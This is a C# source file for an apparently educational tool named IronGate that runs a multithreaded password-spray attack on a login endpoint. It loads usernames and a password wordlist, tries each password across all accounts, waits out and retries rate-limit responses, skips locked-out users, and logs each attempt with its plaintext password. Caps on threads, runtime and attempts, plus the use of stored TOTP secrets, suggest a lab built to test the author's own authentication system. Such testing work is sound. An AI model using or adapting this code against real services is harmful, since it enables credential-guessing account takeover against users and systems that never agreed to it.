
using IronGate.Cli.Constants;
using IronGate.Cli.Helpers;
using IronGate.Cli.Helpers.Dto;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static IronGate.Cli.BruteForce;
#nullable enable

namespace IronGate.Cli.Attacks {
    internal class PasswordSpray {

        // A global counter for all threads. We will have to make critical section for this. Each thread uses the Counter class we made in bruteforce....
        private static int globalHttpAttempts; 

        internal static async Task RunAsync (HttpClient http,AuthConfigDto config,UserSeed seed,string usernamesFile,string passwordList, int threads) {

            var baseDir = AppDomain.CurrentDomain.BaseDirectory;

            // Check validty of files
            if (!File.Exists(usernamesFile)) {
                Console.WriteLine($"Usernames file not found: {usernamesFile}");
                return;
            }

            if (!File.Exists(passwordList)) {
                Console.WriteLine($"Wordlist not found: {passwordList}");
                return;
            }

            // Mark the defaults
            var waitTimeSeconds = config.RateLimitEnabled ? config.RateLimitWindowSeconds : null;
            var maxHttpAttempts = Defaults.DefaultLimit;
            var maxRunTime = TimeSpan.FromSeconds(Defaults.TimeLimitSeconds);

            var groupSeed = seed.GroupSeed;

            // Min threads 1 ; Max threads 20
            if (threads < 1 ) threads = 1;
            if (threads > 20) threads = 20;


            var users = LoadUsernames(usernamesFile);
            if (users.Count == 0) {
                Console.WriteLine($"Username file at {usernamesFile} is empty!");
                return;
            }

            // Our log file (different than brute force) - since many threads, its critical section too.
            var logPath = Path.Combine(baseDir, "spray_log.jsonl");
            using var log = new StreamWriter(logPath, append: true, Encoding.UTF8);
            var logLock = new object();

            // TODO: Move this to prints
            Console.WriteLine("Attack: Password Spray");
            Console.WriteLine($"Usernames: {users.Count}");
            Console.WriteLine($"Threads: {threads}");
            Console.WriteLine($"Stop Conditions: AnySuccess/Runtime({maxRunTime.TotalSeconds}s)/HttpAttempts({maxHttpAttempts})");
            Console.WriteLine($"Log:  {logPath}");


            globalHttpAttempts = 0;
            var started = Stopwatch.StartNew();

            var terminalUsers = new ConcurrentDictionary<string, bool>(StringComparer.OrdinalIgnoreCase);

            // configure ctrl+c to stop
            using var cancelSource = new CancellationTokenSource();
            void handler(object s, ConsoleCancelEventArgs e) {
                e.Cancel = true;
                cancelSource.Cancel();
            }
            Console.CancelKeyPress += handler;

            try {
                using var pwReader = new StreamReader(passwordList, Encoding.UTF8);

                // The main logic continues until no passwords left, or we hit the limit
                while (!pwReader.EndOfStream && !cancelSource.IsCancellationRequested) {

                    if (started.Elapsed > maxRunTime) {
                        Console.WriteLine("Stopped: Runtime limit reached.");
                        return;
                    }

                    if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
                        Console.WriteLine("Stopped: Attempts limit reached.");
                        return;
                    }

                    var password = await pwReader.ReadLineAsync().ConfigureAwait(false);
                    if (password == null) break;

                    password = password.Trim();
                    if (password.Length == 0) continue;

                    // Since we use the same password for all users each round, we make the queue
                    var q = new ConcurrentQueue<string>();
                    foreach (var u in users) {
                        if (terminalUsers.ContainsKey(u)) continue;
                        q.Enqueue(u);
                    }

                    if (q.IsEmpty)
                        break;

                    // found = successful attempts
                    var found = new ConcurrentBag<(string user, string pass)>();

                    // Now we do the task itself per worker
                    var tasks = new List<Task>(threads);
                    for (var i = 0; i < threads; i++) {

                        // IMPORTANT:
                        // - Do NOT pass cancelSource.Token to Task.Run (it will surface TaskCanceledException at the task level)
                        // - Use the token only inside awaits (Delay / your own checks)
                        tasks.Add(Task.Run(async () => {
                            try {
                                // each worker gets its own counter initiated at 0
                                var localCounter = new Counter(0);

                                while (!cancelSource.IsCancellationRequested) {

                                    if (started.Elapsed > maxRunTime) {
                                        cancelSource.Cancel();
                                        break;
                                    }
                                    if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
                                        cancelSource.Cancel();
                                        break;
                                    }

                                    if (!q.TryDequeue(out var username))
                                        break;

                                    if (terminalUsers.ContainsKey(username))
                                        continue;

                                    // Get the totp secret if this user has one
                                    seed.TotpSecrets.TryGetValue(username, out var totpSec);
                                    totpSec ??= string.Empty;

                                    // If we get rate limited, we need to retry...therefor....ANOTHA LOOP
                                    while (!cancelSource.IsCancellationRequested) {

                                        if (started.Elapsed > maxRunTime) {
                                            cancelSource.Cancel();
                                            break;
                                        }
                                        if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
                                            cancelSource.Cancel();
                                            break;
                                        }

                                        // The login action itself
                                        var args = new[] { "login", username, password, "-", "-" };
                                        var before = localCounter.Value;

                                        var (_, resp) = await Login.LoginAction(
                                            http,
                                            args,
                                            (groupSeed ?? string.Empty),
                                            totpSec,
                                            localCounter
                                        ).ConfigureAwait(false);

                                        // Calculate how many http requests occurred within LoginAction
                                        var after = localCounter.Value;
                                        var delta = after - before;
                                        if (delta <= 0) delta = 1;

                                        Interlocked.Add(ref globalHttpAttempts, delta);

                                        // Parse final response (success/fail/rate limit/locked out)
                                        AuthAttemptDto? attempt = null;
                                        AuthResultCode? code = null;

                                        var authAttempt =
                                            (resp != null) &&
                                            HttpUtil.TryReadAuthAttempt(resp, out attempt) &&
                                            attempt != null;

                                        if (authAttempt)
                                            code = attempt!.Result;

                                        // Log the final response
                                        lock (logLock) {
                                            Printers.WriteJsonl(log, new {
                                                attackType = "spray",
                                                attackTimeUtc = DateTimeOffset.UtcNow,
                                                username,
                                                password,
                                                globalHttpAttempts = Volatile.Read(ref globalHttpAttempts),
                                                httpStatus = resp?.StatusCode,
                                                parsed = authAttempt,
                                                attempt,
                                                rawBody = authAttempt ? null : resp?.Body
                                            });
                                        }

                                        // Stop on success
                                        if (authAttempt && attempt!.Success) {
                                            found.Add((username, password));
                                            cancelSource.Cancel();
                                            break;
                                        }

                                        // Stop this username if locked out
                                        if (code == AuthResultCode.LockedOut) {
                                            terminalUsers[username] = true;
                                            break;
                                        }

                                        // Rate limit handling
                                        if (code == AuthResultCode.RateLimited &&
                                            waitTimeSeconds.HasValue &&
                                            waitTimeSeconds.Value > 0) {

                                            try {
                                                await Task.Delay(
                                                    TimeSpan.FromSeconds(waitTimeSeconds.Value),
                                                    cancelSource.Token
                                                ).ConfigureAwait(false);
                                            }
                                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
                                                // normal stop
                                                break;
                                            }

                                            continue;
                                        }

                                        // Normal fail -> next username (exit retry loop)
                                        break;
                                    }
                                }
                            }
                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
                                // normal stop (success/runtime/attempts/ctrl+c)
                            }
                            catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) {
                                // normal stop
                            }
                        }, CancellationToken.None));
                    }

                    try {
                        await Task.WhenAll(tasks).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
                        // normal stop
                    }
                    catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) {
                        // normal stop
                    }

                    if (!found.IsEmpty) {
                        foreach (var (u, p) in found)
                            Console.WriteLine($"Success: {u} / {p}");

                        Console.WriteLine("Stopped: Success found.");
                        return;
                    }
                }

                if (started.Elapsed > maxRunTime)
                    Console.WriteLine("Stopped: Runtime limit reached.");
                else if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts)
                    Console.WriteLine("Stopped: Attempts limit reached.");
                else
                    Console.WriteLine("Finished: Wordlist ended or all users became terminal.");
            }
            finally {
                Console.CancelKeyPress -= handler;
            }
        }



        private static List<string> LoadUsernames(string usernameFile) {

            var list = new List<string>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var line in System.IO.File.ReadLines(usernameFile, Encoding.UTF8)) {

                var u = (line ?? string.Empty).Trim();
                if (u.Length == 0) continue;
                if (seen.Add(u)) 
                    list.Add(u);
               
            }


            return list;
        }

    }
}
